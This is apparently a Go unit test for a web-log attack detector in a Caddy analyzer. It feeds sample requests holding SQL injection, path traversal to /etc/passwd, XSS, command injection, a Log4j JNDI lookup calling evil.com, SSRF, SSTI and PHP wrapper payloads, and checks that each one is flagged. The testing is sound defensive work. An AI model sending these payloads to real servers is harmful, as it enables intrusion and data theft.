package analysis

import (
	"testing"

	"github.com/L9Lenny/caddy-analyzer/pkg/types"
)

func TestDetectorSignatures(t *testing.T) {
	detector := NewDetector()

	tests := []struct {
		name       string
		entry      *types.LogEntry
		expectDet  bool
		expectType DetectionType
	}{
		{
			name: "SQL Injection",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetSQLInjection,
		},
		{
			name: "Path Traversal",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/download?file=../../../../etc/passwd",
				Status:   403,
			},
			expectDet:  true,
			expectType: DetPathTraversal,
		},
		{
			name: "Path Traversal .%2e encoded",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
				UserAgent: "",
				Status:    308,
			},
			expectDet:  true,
			expectType: DetPathTraversal,
		},
		{
			name: "XSS",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/search?q=<script>alert(1)</script>",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetXSS,
		},
		{
			name: "RCE",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/cgi-bin/test.cgi?cmd=cat%20/etc/passwd",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetRCE,
		},
		{
			name: "Sensitive File Probe",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/.env",
				Status:   404,
			},
			expectDet:  true,
			expectType: DetSensitiveFile,
		},
		{
			name: "Log4j JNDI",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/login",
				UserAgent: "${jndi:ldap://evil.com/a}",
				Status:    400,
			},
			expectDet:  true,
			expectType: DetLog4j,
		},
		{
			name: "Scanner Tool UserAgent",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/",
				UserAgent: "sqlmap/1.5.2#stable",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetScanner,
		},
		{
			name: "WordPress Plugin Probe",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/wp-content/plugins/hellopress/wp_filemanager.php",
				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
				Status:    308,
			},
			expectDet:  true,
			expectType: DetWPProbe,
		},
		{
			name: "CGI Bin Probe",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/cgi-bin/test.cgi",
				UserAgent: "Mozilla/5.0",
				Status:    404,
			},
			expectDet:  true,
			expectType: DetCGIProbe,
		},
		{
			name: "WordPress XML-RPC",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/xmlrpc.php",
				UserAgent: "Mozilla/5.0",
				Status:    404,
			},
			expectDet:  true,
			expectType: DetWPProbe,
		},
		{
			name: "SSRF Cloud Metadata",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/proxy?url=http://169.254.169.254/latest/meta-data/",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSRF,
		},
		{
			name: "SSRF Internal Host",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/fetch?url=http://127.0.0.1:6379/",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSRF,
		},
		{
			name: "SSRF Gopher Protocol",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/redirect?url=gopher://127.0.0.1:6379/_SET%20key%20value",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSRF,
		},
		{
			name: "NoSQL Injection",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/login?password[$ne]=invalid&username=admin",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetNoSQLi,
		},
		{
			name: "SSTI Jinja2 Probe",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/page?name={{7*7}}",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSTI,
		},
		{
			name: "SSTI Template Class Probe",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/page?name={{''.__class__.__mro__[1].__subclasses__()}}",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSTI,
		},
		{
			name: "GraphQL Introspection",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/graphql?query={__schema{types{name}}}",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetGraphQL,
		},
		{
			name: "LFI Wrapper PHP Input",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/page?file=php://input",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetLFIWrapper,
		},
		{
			name: "LFI Wrapper Phar",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/page?file=phar://uploaded.phar/shell.php",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetLFIWrapper,
		},
		{
			name: "Admin Probe Actuator",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/actuator/env",
				UserAgent: "Mozilla/5.0",
				Status:    404,
			},
			expectDet:  true,
			expectType: DetAdminProbe,
		},
		{
			name: "Admin Probe Heapdump",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/heapdump",
				UserAgent: "Mozilla/5.0",
				Status:    404,
			},
			expectDet:  true,
			expectType: DetAdminProbe,
		},
		{
			name: "Scanner Nuclei",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/",
				UserAgent: "Mozilla/5.0 (compatible; Nuclei)",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetScanner,
		},
		{
			name: "Legitimate Request",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/menu",
				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
				Status:    200,
			},
			expectDet: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			det := detector.Detect(tt.entry)
			if tt.expectDet {
				if det == nil {
					t.Fatalf("expected detection, got nil")
				}
				if det.Type != tt.expectType {
					t.Errorf("expected detection type %s, got %s", tt.expectType, det.Type)
				}
			} else {
				if det != nil {
					t.Errorf("expected no detection, got %v", det)
				}
			}
		})
	}
}
